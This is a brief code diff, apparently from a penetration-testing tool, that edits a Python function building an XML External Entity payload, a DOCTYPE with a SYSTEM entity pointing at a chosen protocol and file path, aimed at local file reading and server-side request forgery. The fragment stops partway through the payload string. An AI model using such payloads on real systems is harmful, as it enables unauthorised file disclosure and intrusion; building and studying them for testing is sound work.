@@ -1,5 +1,5 @@
 def update_templates(entityv, proto, filep, url_lfi, ssrfp):
-    return (#
+    return (
         f"""
             <?xml version="1.0">
             <!DOCTYPE replace [<!ENTITY {entityv} SYSTEM "{proto}://{filep}"> ]>
